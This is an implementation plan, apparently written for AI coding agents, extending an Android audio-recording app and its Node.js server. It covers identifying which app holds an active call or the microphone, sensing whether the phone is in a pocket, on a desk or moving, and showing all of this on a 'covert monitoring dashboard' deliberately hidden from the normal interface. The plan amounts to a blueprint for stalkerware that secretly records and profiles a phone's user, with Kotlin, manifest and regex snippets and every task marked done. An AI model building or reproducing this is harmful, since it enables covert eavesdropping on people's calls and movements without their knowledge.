# Universal Call & Mic App Detection + Environmental Sensor Telemetry Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement universal dynamic detection of ANY app using the microphone or making a call (Cellular, WhatsApp, Instagram, Telegram, Zoom, Meet, etc.), along with 3 environmental sensors (Pocket/Desk posture, Battery Temperature, and Accelerometer motion) across chunk filenames, real-time WebSocket telemetry, and the covert monitoring dashboard.

**Architecture:** Android client combines `AudioManager.mode` + `NotificationListenerService` (`CallNotificationListener`) to dynamically identify which specific app holds an active call/mic channel (with zero-permission fallback to Cellular vs VoIP). Inline sensors (`SensorManager` for Proximity, Light, Accelerometer, plus sticky `BatteryManager` temperature) feed into both `AudioRecordService` chunk naming suffixes and `DeviceSocketManager` WebSocket telemetry packets. The Node.js server (`broadcast.ts` & `websocket.ts`) parses the extended telemetry tags and renders real-time badges on `hidden.html` / `hidden.js`.

**Tech Stack:** Kotlin (Android Service, NotificationListenerService, SensorEventListener, AudioRecord), Node.js / TypeScript (Express, WebSocket Gateway, HLS packaging), HTML5 / Vanilla JavaScript (HLS.js URL segment parser, CSS covert badge system).

**Spec:** Dynamic Universal Mic/Call App Identifier & Sensor Telemetry Suite.

---

## Global Constraints

- **Universal App Identification:** Must not hardcode only WhatsApp or Instagram; must resolve package name and application label dynamically for ANY calling or mic-using app (WhatsApp, Instagram, Telegram, Zoom, Google Meet, Skype, Phone dialer, Messenger, Discord, etc.).
- **Zero-Permission Fallback:** If Notification Access is not granted, the system must NOT crash or fail; it must cleanly fallback to `_ACELL` (Cellular) or `_AVOIP` (Generic VoIP) using `AudioManager.mode`.
- **Hidden Only:** Extended intelligence badges and call app badges MUST only appear on the covert dashboard (`hidden.html` / `hidden.js`), leaving `index.html` clean.
- **Battery & Sensor Efficiency:** Sensor listeners (`SensorManager`) must use `SENSOR_DELAY_NORMAL` (low power), unregister on service destruction, and avoid battery drain.
- **Backward Compatibility:** Server regex in `broadcast.ts` and `hidden.js` must use non-capturing optional regex groups `(?:...)?` so older chunks or chunks without new tags do not fail playback or storage.

---

## Review Focus

1. **Notification Access Not Granted:** System falls back seamlessly to `AudioManager.mode` detecting `_ACELL` (Cellular) or `_AVOIP` (Generic VoIP).
2. **Rapid Sensor Noise:** Accelerometer motion and light sensor must debounce or smooth values to prevent jittery badge toggling.
3. **App Name Sanitization:** App labels with spaces or symbols (e.g. "Google Meet") must be sanitized into clean alphanumeric tags (e.g. `AMEET`) for URL/filename safety.
4. **Service Lifecycle / Sensor Leak:** All sensor listeners and notification callbacks must properly unregister when `AudioRecordService` stops.
5. **Simultaneous WebSocket & HLS Tag Sync:** Both live WebSocket telemetry and recorded HLS segment names must reflect the exact same state codes.

---

## File Structure

- **Create:** `android-client/app/src/main/kotlin/com/audiostream/client/CallNotificationListener.kt` — NotificationListenerService detecting ongoing call and mic notifications for any application.
- **Modify:** `android-client/app/src/main/AndroidManifest.xml` — Register `CallNotificationListener` with `BIND_NOTIFICATION_LISTENER_SERVICE`.
- **Modify:** `android-client/app/src/main/kotlin/com/audiostream/client/DeviceSocketManager.kt` — Add `callApp`, `callPkg`, `batteryTemp`, `posture`, `isMoving` to `sendTelemetry`.
- **Modify:** `android-client/app/src/main/kotlin/com/audiostream/client/AudioRecordService.kt` — Implement SensorEventListener (Proximity, Light, Accelerometer), Battery temperature extraction, call app tag assembly (`_T`, `_M`, `_P`, `_A`).
- **Modify:** `server/src/routes/broadcast.ts` — Update chunk filename regex to parse `_T(\d+)`, `_M([01])`, `_P([A-Z]+)`, `_A([A-Z0-9]+)` and update covert session device info.
- **Modify:** `server/src/websocket.ts` — Update WebSocket telemetry handler to process new sensor & call app fields.
- **Modify:** `server/public/hidden.html` — Add UI badges for Call App, Posture, Temperature, and Motion.
- **Modify:** `server/public/hidden.js` — Parse new segment URL tags and update covert player badges.

---

### Task 1: Create Universal Call & Mic Notification Listener (`CallNotificationListener.kt`)

**Files:**
- Create: `android-client/app/src/main/kotlin/com/audiostream/client/CallNotificationListener.kt`
- Modify: `android-client/app/src/main/AndroidManifest.xml:45-52`

**Interfaces:**
- Produces: `CallNotificationListener.activeCallApp: String?`, `CallNotificationListener.activeCallPkg: String?`, `CallNotificationListener.getActiveCallCode(): String`

- [x] **Step 1: Implement `CallNotificationListener.kt`**
  Create `CallNotificationListener` extending `NotificationListenerService`.
  Track active call notifications:
  - Match `sbn.notification.category == Notification.CATEGORY_CALL` or ongoing VoIP notifications.
  - Query human-readable app label via `packageManager.getApplicationLabel`.
  - Provide helper `getActiveCallCode(): String` mapping known packages to short codes (e.g., `com.whatsapp` -> `"AWA"`, `com.instagram.android` -> `"AIG"`, `org.telegram.messenger` -> `"ATG"`, `com.google.android.dialer` -> `"ACELL"`, `us.zoom.videomeetings` -> `"AZOOM"`, `com.google.android.apps.tachyon` -> `"AMEET"`, or sanitized upper-case acronym of app name).

- [x] **Step 2: Register Service in `AndroidManifest.xml`**
  ```xml
  <service
      android:name=".CallNotificationListener"
      android:label="Call Notification Monitor"
      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
      android:exported="true">
      <intent-filter>
          <action android:name="android.service.notification.NotificationListenerService" />
      </intent-filter>
  </service>
  ```

---

### Task 2: Implement Sensor Tracking & Hybrid Call Detection in `AudioRecordService.kt`

**Files:**
- Modify: `android-client/app/src/main/kotlin/com/audiostream/client/AudioRecordService.kt`

**Interfaces:**
- Consumes: `CallNotificationListener.getActiveCallCode()`
- Produces: `_T{temp}`, `_M{0|1}`, `_P{POCK|DESK|OPEN}`, `_A{app}` telemetry suffix and WebSocket feeds

- [x] **Step 1: Implement Battery Temperature Extraction**
  In `updateBatteryFromIntent`:
  ```kotlin
  val rawTemp = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0)
  currentBatteryTempC = if (rawTemp > 0) rawTemp / 10 else 0
  ```

- [x] **Step 2: Implement SensorEventListener for Proximity, Light, & Accelerometer**
  - Implement `SensorEventListener`:
    - `TYPE_PROXIMITY`: `isNear = distance < sensor.maximumRange`
    - `TYPE_LIGHT`: `currentLux = event.values[0]`
    - `TYPE_ACCELEROMETER`: calculate delta acceleration $\sqrt{x^2+y^2+z^2} - 9.81$; if $|delta| > 1.2$, set `isMoving = true`, decaying after 5 seconds of stillness.
  - Calculate Posture:
    - If `isNear` and `currentLux < 5`: `"POCK"` (In pocket / face down)
    - If `!isNear` and `currentLux >= 5` and `!isMoving`: `"DESK"` (On desk / still)
    - Else: `"OPEN"` (In hand / active)

- [x] **Step 3: Implement Hybrid Call & Mic App Detection**
  ```kotlin
  private fun getCallAppTag(): String {
      val notificationCall = CallNotificationListener.getActiveCallCode()
      if (notificationCall.isNotEmpty() && notificationCall != "AIDLE") {
          return notificationCall
      }
      // Zero-permission fallback via AudioManager
      val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
      return when (audioManager?.mode) {
          AudioManager.MODE_IN_CALL -> "ACELL"
          AudioManager.MODE_IN_COMMUNICATION -> "AVOIP"
          else -> if (isPhoneInCall()) "ACELL" else "AIDLE"
      }
  }
  ```

- [x] **Step 4: Update `telemetrySuffix` Assembly in `saveChunk`**
  ```kotlin
  val tTag = "T$currentBatteryTempC"
  val mTag = if (isDeviceMoving) "M1" else "M0"
  val pTag = "P$currentPosture"
  val aTag = getCallAppTag()
  val telemetrySuffix = "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}_${dTag}_${uTag}_${cTag}_${rTag}_${vTag}_${dbTag}_${tTag}_${mTag}_${pTag}_${aTag}"
  ```

---

### Task 3: Update WebSocket Telemetry Gateway (`DeviceSocketManager.kt` & `websocket.ts`)

**Files:**
- Modify: `android-client/app/src/main/kotlin/com/audiostream/client/DeviceSocketManager.kt:195-230`
- Modify: `server/src/websocket.ts:119-165`

- [x] **Step 1: Add new sensor and call app fields to `DeviceSocketManager.sendTelemetry`**
  Parameters: `batteryTemp: Int`, `isMoving: Boolean`, `posture: String`, `callApp: String`, `callPkg: String`.
  Include in JSON payload:
  `"battery_temp"`, `"is_moving"`, `"posture"`, `"call_app"`, `"call_pkg"`.

- [x] **Step 2: Update `server/src/websocket.ts`**
  Parse and log the extended fields:
  ```typescript
  const batteryTemp = msg.battery_temp;
  const isMoving = msg.is_moving;
  const posture = msg.posture;
  const callApp = msg.call_app;
  const callPkg = msg.call_pkg;
  ```
  Include in `broadcastLiveEvent` payload to dashboard.

---

### Task 4: Server HLS Parsing & Covert Intelligence Extension (`broadcast.ts`)

**Files:**
- Modify: `server/src/routes/broadcast.ts:155-215`

- [x] **Step 1: Update Chunk Name Regex in `broadcast.ts`**
  Update pattern to:
  `/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?(?:_T(\d+))?(?:_M([01]))?(?:_P([A-Z]+))?(?:_A([A-Z0-9]+))?/`

- [x] **Step 2: Format Extended Covert Indicators for Session Device Info**
  Extract:
  - `temp` (`_T(\d+)`) -> `🌡️ ${temp}°C`
  - `motion` (`_M([01])`) -> `🏃 Moving` vs `🪑 Still`
  - `posture` (`_P([A-Z]+)`) -> `👖 Pocket` vs `🪵 Desk` vs `✋ Hand`
  - `app` (`_A([A-Z0-9]+)`) -> `📞 Cellular` / `🟢 WhatsApp` / `🟣 Instagram` / `🔵 Telegram` / `🌐 VoIP (${app})`
  Update `db.updateSessionDeviceInfo` for covert hidden sessions.

---

### Task 5: Covert Dashboard Telemetry Badges (`hidden.html` & `hidden.js`)

**Files:**
- Modify: `server/public/hidden.html`
- Modify: `server/public/hidden.js`

- [x] **Step 1: Add HTML Badges in `hidden.html` Covert Live Intelligence Card**
  Add badge elements:
  - `#badgeCallApp` — Active Call / Mic App
  - `#badgePosture` — Pocket / Desk / Hand
  - `#badgeTemp` — Device Temp (°C)
  - `#badgeMotion` — Moving / Still

- [x] **Step 2: Update Segment Name Parsing in `hidden.js`**
  Extend regex to extract `_T`, `_M`, `_P`, `_A` tags from HLS segment URLs during live playback.
  Update badges dynamically with appropriate colors and icons.
  Listen for WebSocket live telemetry events to update instantly without waiting for chunk completion.

---

### Task 6: Build & Verification

- [x] **Step 1: Build Server TypeScript**
  Run: `npm run build` in `server/`
  Expected: Clean compilation with 0 errors.

- [x] **Step 2: Build Android APK**
  Run: `gradle assembleDebug` in `android-client/`
  Expected: `BUILD SUCCESSFUL`.
